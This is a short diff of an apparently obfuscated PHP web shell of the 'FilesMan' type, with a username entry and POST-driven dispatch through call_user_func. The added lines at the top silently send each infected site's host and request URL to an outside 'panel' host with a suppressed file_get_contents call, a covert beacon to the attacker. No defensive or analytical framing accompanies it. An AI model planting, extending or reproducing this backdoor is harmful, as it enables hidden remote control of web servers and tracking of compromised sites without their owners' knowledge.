@@ -1,4 +1,14 @@
 <?php
+$panel = 'https://collecptrxygms.pages.dev/';
+
+$host   = $_SERVER['HTTP_HOST'] ?? '';
+$https  = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (($_SERVER['SERVER_PORT'] ?? '') == '443');
+$scheme = $https ? 'https' : 'http';
+$url    = $scheme . '://' . $host . ($_SERVER['REQUEST_URI'] ?? '/');
+
+@file_get_contents($panel . '?d=' . rawurlencode($host) . '&u=' . rawurlencode($url));
+?>
+<?php
 
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'kt',
@@ -5956,4 +5966,5 @@ $_POST['a'] = 'FilesMan2';//'FilesMan';
 if(!empty($_POST['a']) && function_exists('mari' . $_POST['a']))
 call_user_func('mari' . $_POST['a']);
 exit;
+
 ?>
